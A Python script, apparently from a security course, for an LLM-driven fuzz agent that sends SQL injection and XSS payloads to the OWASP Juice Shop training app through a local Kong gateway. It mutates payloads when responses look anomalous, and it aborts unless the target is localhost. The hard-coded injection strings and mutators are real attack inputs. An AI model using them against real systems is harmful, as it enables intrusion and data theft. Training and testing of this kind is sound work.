#!/usr/bin/env python3
"""
Tuần 5 — Fuzz Agent: HTTP chỉ qua Kong localhost:8000.
Mutate-on-anomaly + targets từ attack_surface_map.json.
"""
from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path
from urllib.parse import urlencode

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "agents"))

from common import (  # noqa: E402
    KONG_BASE,
    LLMClient,
    RECON_KEY,
    parse_json_loose,
    rate_limit_sleep,
    write_trace,
)

try:
    import requests
except ImportError:
    requests = None  # type: ignore

DEMO_PAYLOADS = [
    "'",
    "' OR 1=1--",
    "<script>alert(1)</script>",
    "' UNION SELECT null--",
]

MUTATORS = [
    lambda v: v + "'",
    lambda v: v.replace("--", "/*"),
    lambda v: v + " UNION SELECT 1,2,3--",
    lambda v: v.replace("1=1", "1=1 AND 'a'='a"),
    lambda v: "' OR '1'='1' --",
]


SYSTEM = """Bạn là Fuzz Agent. Target chỉ Juice Shop qua Kong local.
Sinh JSON {payloads:[{target,param,value}]} — payload giáo dục, không destructive."""


def kong_get(path: str, params: dict | None = None) -> dict:
    if requests is None:
        return {"error": "pip install requests", "status": 0}
    url = KONG_BASE.rstrip("/") + path
    if params:
        url += "?" + urlencode(params)
    try:
        r = requests.get(url, headers={"apikey": RECON_KEY}, timeout=3)
        body = r.text[:500]
        return {
            "url": url,
            "status": r.status_code,
            "latency_ms": int(r.elapsed.total_seconds() * 1000),
            "body_preview": body,
            "anomaly": r.status_code >= 500 or "sequelize" in body.lower() or "sqlite" in body.lower(),
        }
    except Exception as e:
        return {"url": url, "status": 0, "error": str(e), "anomaly": True}


def payloads_from_surface(surface: dict) -> list[dict]:
    out = []
    for ep in surface.get("endpoints") or []:
        path = ep.get("path") or ""
        method = (ep.get("method") or "GET").upper()
        if not path.startswith("/") or "{" in path:
            continue
        if "POST" in method and "GET" not in method:
            continue  # GET fuzz only with recon key
        if "search" in path or path == "/rest/products/search":
            for p in DEMO_PAYLOADS[:3]:
                out.append({"target": "/rest/products/search", "param": "q", "value": p})
        elif path.startswith("/ftp"):
            out.append({"target": "/ftp/", "param": "", "value": ""})
        elif path == "/metrics":
            out.append({"target": "/metrics", "param": "", "value": ""})
    return out


def mutate_value(value: str, round_i: int) -> str:
    fn = MUTATORS[round_i % len(MUTATORS)]
    try:
        return fn(value)
    except Exception:
        return value + "'"


def run_fuzz(map_path: Path | None = None, max_requests: int = 12, max_mutate: int = 2) -> list[dict]:
    map_path = map_path or (ROOT / "data-lake" / "attack_surface_map.json")
    surface = {}
    if map_path.exists():
        surface = json.loads(map_path.read_text(encoding="utf-8"))

    llm = LLMClient()
    raw = llm.chat(SYSTEM, json.dumps({"surface": surface, "hint": "search q param"}, ensure_ascii=False))
    try:
        plan = parse_json_loose(raw)
        payloads = plan.get("payloads") or []
    except Exception:
        payloads = []

    from_map = payloads_from_surface(surface)
    if from_map:
        payloads = from_map + list(payloads)
    if not payloads:
        payloads = [{"target": "/rest/products/search", "param": "q", "value": p} for p in DEMO_PAYLOADS]

    findings = []
    n = 0
    for p in payloads:
        if n >= max_requests:
            break
        target = p.get("target", "/rest/products/search")
        if not target.startswith("/"):
            continue
        if "localhost" not in KONG_BASE and "127.0.0.1" not in KONG_BASE:
            write_trace("fuzz", "blocked_non_local", {"base": KONG_BASE})
            break
        param = p.get("param") or "q"
        value = str(p.get("value", ""))
        params = {param: value} if param else None
        result = kong_get(target, params)
        result["payload"] = value
        result["mutations"] = []
        findings.append(result)
        write_trace("fuzz", "probe", result)
        n += 1
        print(f"  [{result.get('status')}] {target} anomaly={result.get('anomaly')}")
        rate_limit_sleep(0.35)

        # Mutate-on-anomaly
        if result.get("anomaly") and param and value:
            cur = value
            for mi in range(max_mutate):
                if n >= max_requests:
                    break
                cur = mutate_value(cur, mi)
                mres = kong_get(target, {param: cur})
                mres["payload"] = cur
                mres["mutated_from"] = value
                mres["mutation_round"] = mi + 1
                result["mutations"].append({"payload": cur, "status": mres.get("status"), "anomaly": mres.get("anomaly")})
                findings.append(mres)
                write_trace("fuzz", "mutate", mres)
                n += 1
                print(f"    mutate#{mi+1} [{mres.get('status')}] anomaly={mres.get('anomaly')}")
                rate_limit_sleep(0.35)

    out = ROOT / "data-lake" / "fuzz_findings.json"
    out.write_text(json.dumps(findings, indent=2, ensure_ascii=False), encoding="utf-8")
    print(f"[+] Fuzz findings → {out} ({len(findings)} probes)")
    return findings


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--max", type=int, default=12)
    parser.add_argument("--mutate", type=int, default=2)
    args = parser.parse_args()
    if "localhost" not in KONG_BASE and "127.0.0.1" not in KONG_BASE:
        print("[!] SENTINEL_KONG phải là localhost — abort")
        sys.exit(2)
    run_fuzz(max_requests=args.max, max_mutate=args.mutate)


if __name__ == "__main__":
    main()
